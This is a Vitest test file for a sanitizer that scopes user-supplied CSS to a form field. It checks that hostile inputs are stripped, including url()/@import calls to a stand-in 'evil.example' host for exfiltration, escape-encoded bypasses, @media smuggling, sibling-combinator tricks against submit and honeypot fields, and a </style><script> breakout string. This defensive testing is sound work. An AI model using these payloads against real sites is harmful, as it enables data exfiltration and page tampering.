import { describe, expect, it } from 'vitest';
import { MAX_FIELD_CSS_LENGTH, sanitizeFieldCss } from './custom-css';

const SCOPE = '[data-field="email"]';
const san = (css: string) => sanitizeFieldCss(css, SCOPE);

describe('sanitizeFieldCss — scoping', () => {
  it('prefixes every selector with the field scope', () => {
    const { css } = san('input { color: red; }');
    expect(css).toContain('[data-field="email"] input');
    expect(css).toMatch(/color:\s*red/);
  });

  it('scopes each selector in a comma list', () => {
    const { css } = san('label, .hint { color: blue; }');
    expect(css).toContain('[data-field="email"] label');
    expect(css).toContain('[data-field="email"] .hint');
  });

  it('keeps safe visual declarations', () => {
    const { css } = san('input { border: 2px solid #333; border-radius: 8px; padding: 6px; }');
    expect(css).toMatch(/border-radius:\s*8px/);
    expect(css).toMatch(/padding:\s*6px/);
  });
});

describe('sanitizeFieldCss — blocks page-escape / exfiltration vectors', () => {
  it('drops url() (network exfiltration) declarations', () => {
    const { css, removed } = san('input { background: url(https://evil.example/?leak=1); }');
    expect(css).not.toContain('url(');
    expect(css).not.toContain('evil.example');
    expect(removed.join(' ')).toMatch(/url\(\)/);
  });

  it('drops @import', () => {
    const { css, removed } = san('@import url(https://evil.example/x.css); input { color: red; }');
    expect(css).not.toContain('@import');
    expect(css).not.toContain('evil.example');
    expect(css).toContain('[data-field="email"] input'); // the safe rule survives
    expect(removed.join(' ')).toMatch(/@import/);
  });

  it('drops @font-face (remote font fetch)', () => {
    const { css, removed } = san('@font-face { font-family: x; src: url(https://evil/f.woff); }');
    expect(css).not.toContain('@font-face');
    expect(css).not.toContain('evil');
    expect(removed.join(' ')).toMatch(/@font-face/);
  });

  it('drops position: fixed and sticky (escape the shadow), keeps relative', () => {
    expect(san('input { position: fixed; top: 0; }').css).not.toContain('fixed');
    expect(san('input { position: sticky; }').css).not.toContain('sticky');
    expect(san('input { position: relative; }').css).toMatch(/position:\s*relative/);
  });

  it('drops host/page-piercing selectors', () => {
    for (const sel of [':host', ':host-context(body)', '::part(x)', ':root', 'html', 'body']) {
      const { css } = san(`${sel} { color: red; }`);
      expect(css).not.toContain('color'); // whole rule dropped
    }
  });

  it('drops legacy script vectors', () => {
    expect(san('input { color: expression(alert(1)); }').css).not.toContain('expression');
    expect(san('input { behavior: url(x.htc); }').css).not.toContain('behavior');
    expect(san('input { -moz-binding: url(x.xml); }').css).not.toContain('binding');
  });

  it('drops non-allowlisted properties', () => {
    const { css, removed } = san('input { color: red; -webkit-touch-callout: none; }');
    expect(css).toMatch(/color:\s*red/);
    expect(css).not.toContain('touch-callout');
    expect(removed.join(' ')).toMatch(/not allowed/);
  });
});

describe('sanitizeFieldCss — @media + limits', () => {
  it('allows @media and scopes the rules inside', () => {
    const { css } = san('@media (max-width: 480px) { input { font-size: 12px; } }');
    expect(css).toContain('@media');
    expect(css).toContain('[data-field="email"] input');
    expect(css).toMatch(/font-size:\s*12px/);
  });

  it('rejects CSS over the length cap', () => {
    const big = `input { color: red; } ${'/* pad */'.repeat(MAX_FIELD_CSS_LENGTH)}`;
    const { css, removed } = sanitizeFieldCss(big, SCOPE);
    expect(css).toBe('');
    expect(removed.join(' ')).toMatch(/exceeds/);
  });

  it('returns empty for blank input, never throws on garbage', () => {
    expect(san('').css).toBe('');
    expect(() => san('}{)(#$%^ not css @@@ ;;;')).not.toThrow();
  });

  it('a rule with only unsafe declarations is dropped entirely', () => {
    const { css } = san('input { background: url(https://evil/x); }');
    expect(css).toBe('');
  });
});

describe('sanitizeFieldCss — red-team regressions (must stay neutralized)', () => {
  // Escape sequences: css-tree keeps them raw, browsers decode them.
  it('drops escaped url()/image-set/element/paint/expression', () => {
    for (const p of [
      '.x { background: \\75 rl("http://evil/a"); }',
      '.x { background: \\000075\\000072\\00006C("http://evil/a"); }',
      '.x { background: image\\2d set("http://evil/a" 1x); }',
      '.x { filter: \\75 rl(#evil); }',
      '.x { background: el\\65 ment(#foo); }',
      '.x { background: pai\\6e t(w); }',
      '.x { width: \\65 xpression(alert(1)); }',
      'a { background: \\69 mage-set("http://evil/x" 1x); }',
    ]) {
      const { css } = san(p);
      expect(css).not.toContain('\\');
      expect(css.toLowerCase()).not.toMatch(/evil|expression|paint|element/);
    }
  });

  it('drops escaped position:fixed/sticky and IE hacks', () => {
    for (const p of ['a{position:\\66 ixed}', 'a{position:\\73ticky}', 'a{position:fixed\\9}']) {
      expect(san(p).css).not.toContain('\\');
      expect(san(p).css.toLowerCase()).not.toContain('fixed');
    }
  });

  it('drops escaped host/page selectors', () => {
    for (const sel of [':\\68 ost', ':\\72 oot', '\\62 ody', '\\68 tml']) {
      expect(san(`${sel} { color: red; }`).css).toBe('');
    }
  });

  // @media prelude smuggling: the query itself must be validated.
  it('drops @media whose prelude carries url()/image-set/expression', () => {
    for (const p of [
      '@media (min-width: url(https://evil/mq)) { .a{color:red} }',
      '@media (a: url("https://evil/q")) { .a{color:red} }',
      '@media (min-width: image-set("https://evil/i")) { .a{color:red} }',
      '@media screen, print and expression(x) { .a{color:red} }',
    ]) {
      const { css } = san(p);
      expect(css.toLowerCase()).not.toMatch(/url\(|evil|image-set|expression/);
    }
  });

  // Leading combinators reach OUT of the field to siblings (submit/honeypot).
  it('drops selectors with a leading combinator or nesting &', () => {
    for (const p of [
      '~ button[type=submit] { display: none }',
      '~ [name=hp] { display: block }',
      '+ * { opacity: 0 }',
      '~ * { color: red }',
      '~ .honeypot { color: red }',
      '& ~ .x { color: red }',
    ]) {
      const { css } = san(p);
      // No selector may join the scope with a sibling/child/nesting combinator.
      expect(css).not.toMatch(/\]\s*[~+&]/);
      expect(css).not.toContain('honeypot');
      expect(css).not.toContain('submit');
    }
  });

  it('drops values/selectors that would break out of the shadow <style> (</style> / < >)', () => {
    // font-family IS allow-listed, so the string value must be neutralized.
    const { css } = san('.x { font-family: "</style><script>alert(1)</script>"; }');
    expect(css).not.toContain('<');
    expect(css).not.toContain('</style');
    expect(san('.x { color: red; font-family: "a>b"; }').css).not.toContain('>');
  });

  it('keeps a legitimate sibling combinator INSIDE the field scope', () => {
    // `.a ~ .b` (non-leading) stays contained: both are descendants of the field.
    const { css } = san('.a ~ .b { color: red; }');
    expect(css).toMatch(/\[data-field="email"\] \.a\s*~\s*\.b/);
  });
});
